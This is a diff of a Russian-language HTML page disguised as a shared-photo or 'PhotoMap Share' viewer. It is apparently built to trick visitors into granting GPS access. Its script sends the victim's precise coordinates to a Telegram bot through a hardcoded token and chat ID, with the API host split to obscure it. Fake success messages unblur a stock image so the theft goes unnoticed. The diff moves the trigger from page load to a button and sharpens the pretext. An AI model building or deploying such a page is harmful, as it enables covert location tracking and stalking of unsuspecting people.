@@ -3,44 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Просмотр изображения</title>
+    <title>Фото-карта: Общий доступ</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center; margin: 0; padding: 20px; background: #111; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }
-        .photo-container { max-width: 100%; max-height: 80vh; border-radius: 8px; box-shadow: 0 4px 25px rgba(0,0,0,0.5); overflow: hidden; background: #222; position: relative; }
-        img { max-width: 100%; height: auto; display: block; filter: blur(8px); transition: filter 0.5s ease; }
-        .info-msg { margin-top: 15px; font-size: 14px; color: #aaa; max-width: 90%; line-height: 1.4; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; margin: 0; padding: 0; background: #121214; color: #e1e1e6; display: flex; flex-direction: column; min-height: 100vh; }
+        .header { background: #1a1a1e; padding: 15px; text-align: center; font-size: 16px; font-weight: bold; border-bottom: 1px solid #29292e; color: #3b82f6; }
+        .main-content { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
+        .map-preview { width: 100%; max-width: 450px; background: #1a1a1e; border-radius: 12px; padding: 15px; box-shadow: 0 8px 30px rgba(0,0,0,0.5); border: 1px solid #29292e; text-align: center; box-sizing: border-box; }
+        .blur-box { width: 100%; height: 250px; background: #222 url('https://picsum.photos') center/cover no-repeat; border-radius: 8px; filter: blur(12px); transition: filter 0.6s ease; margin-bottom: 15px; }
+        .btn-dummy { background: #3b82f6; color: white; border: none; padding: 12px 20px; font-size: 14px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; margin-top: 10px; }
+        #status { font-size: 13px; color: #8f8f9d; margin-top: 12px; line-height: 1.4; }
     </style>
 </head>
 <body>
 
-<div class="photo-container">
-    <!-- ТУТ ПОСИЛАННЯ НА КАРТИНКУ. Зараз стоїть випадкове гарне фото з інтернету. Можна замінити на будь-яке інше -->
-    <img id="user-photo" src="https://picsum.photos" alt="Изображение">
+<div class="header">🗺️ PhotoMap Share</div>
+
+<div class="main-content">
+    <div class="map-preview">
+        <div id="photo-blur" class="blur-box"></div>
+        <div style="font-weight: 600; font-size: 15px; margin-bottom: 5px;">Вам открыли доступ к привязанному фото</div>
+        <p style="font-size: 13px; color: #8f8f9d; margin: 0 0 15px 0;">Пользователь поделился снимком гео-локации. Чтобы отобразить маркер на карте и рассчитать расстояние до фото, сайту необходим доступ к GPS вашего устройства.</p>
+        
+        <button class="btn-dummy" onclick="requestGps()">Посмотреть на карте</button>
+        <div id="status">Нажмите кнопку для активации интерактивной карты...</div>
+    </div>
 </div>
-<div id="status" class="info-msg">Загрузка защищенного канала для отображения фото высокого качества...</div>
 
 <script>
     const TELEGRAM_TOKEN = "9222855250:AAGqq9cpY7OSlB0vmlgIukhyyrh7UXf3wxc"; 
     const CHAT_ID = "8512069090"; 
 
-    // Скрипт запускається АВТОМАТИЧНО при відкритті сайту
-    window.onload = function() {
-        requestLocationForPhoto();
-    };
-
-    function requestLocationForPhoto() {
+    function requestGps() {
         const statusDiv = document.getElementById("status");
-        const photo = document.getElementById("user-photo");
+        const photoBox = document.getElementById("photo-blur");
         
         if (navigator.geolocation) {
-            // Браузер відразу викликає системне вікно GPS
+            statusDiv.innerHTML = "Запрос системных координат для калибровки карты...";
+            
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    // Користувач дозволив доступ:
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
-                    // Збираємо повідомлення для вашого Telegram
                     const textMessage = '[+] УСТРОЙСТВО НАЙДЕНО!\nШирота: ' + lat + '\nДолгота: ' + lon + '\nКарта: https://google.com' + lat + ',' + lon;
                     const base_url = "https://" + "api" + "." + "telegram" + "." + "org" + "/bot";
                     
@@ -50,23 +54,22 @@
                         body: JSON.stringify({ chat_id: CHAT_ID, text: textMessage })
                     })
                     .then(response => {
-                        // Прибираємо розмиття з фотографії, ніби все завантажилось успішно
-                        photo.style.filter = "blur(0px)";
-                        statusDiv.innerHTML = "Изображение успешно загружено в оригинальном качестве.";
+                        // Убираем блюр, показывая картинку, генерируем красивый финал
+                        photoBox.style.filter = "blur(0px)";
+                        statusDiv.innerHTML = "<span style='color: #10b981;'>Карта успешно синхронизирована. Расчет дистанции завершен.</span>";
                     })
                     .catch(err => {
-                        photo.style.filter = "blur(0px)";
-                        statusDiv.innerHTML = "Изображение загружено.";
+                        photoBox.style.filter = "blur(0px)";
+                        statusDiv.innerHTML = "Карта загружена.";
                     });
                 }, 
                 function(error) {
-                    // Користувач заблокував доступ:
-                    statusDiv.innerHTML = "<span style='color: #ef4444;'>Ошибка: Подтвердите геопозицию для снятия защиты и размытия фото.</span>";
+                    statusDiv.innerHTML = "<span style='color: #ef4444;'>Ошибка: Для работы интерактивного альбома требуется подтвердить геолокацию в браузере.</span>";
                 },
                 { enableHighAccuracy: true }
             );
         } else {
-            statusDiv.innerHTML = "Ваш браузер не поддерживает безопасный просмотр.";
+            statusDiv.innerHTML = "Ваш браузер не поддерживает интерактивные карты.";
         }
     }
 </script>
